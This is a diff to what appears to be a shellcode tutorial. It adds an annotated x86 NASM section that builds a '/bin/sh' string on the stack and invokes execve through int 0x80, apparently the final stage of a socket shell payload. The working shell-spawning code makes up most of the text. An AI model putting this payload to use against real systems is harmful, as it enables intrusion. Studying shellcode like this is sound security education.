@@ -233,8 +233,32 @@ int 0x80	; interrupt
 jnz sockfd_func ; loop back to sockfd_func if not zero
 ```
 
+### Execve
+```nasm
+; int execve(const char *filename, char *const argv[], char *const envp[]);
+; syscall number: 11 (0xb)
+;
+; Argument Values:
+; *filename = Memory address of a null terminated string "/bin/sh"
+; *argv[] = [*"/bin/sh", 0x00000000]
+; *envp = NULL
 
+xor ecx, ecx
 
+; This has to be pushed in reverse because of how things move to the stack
+; Pushing /bin/sh null terminated string
+
+push cx
+push dword 0x68732f2f	; push / / s h
+push dword 0x6e69622f 	; push / b i n
+
+mov ebx, esp		; Store pointer to "/bin/sh" in ebx
+push ecx 		; Push NULL
+push ebx 		; Push *filename
+mov ecx, esp 		; Store memory address pointing to memory address of "/bin/sh"
+mov al, 0xb		; execve call
+int 0x80 		; Execute SHELL
+```
 
 
 
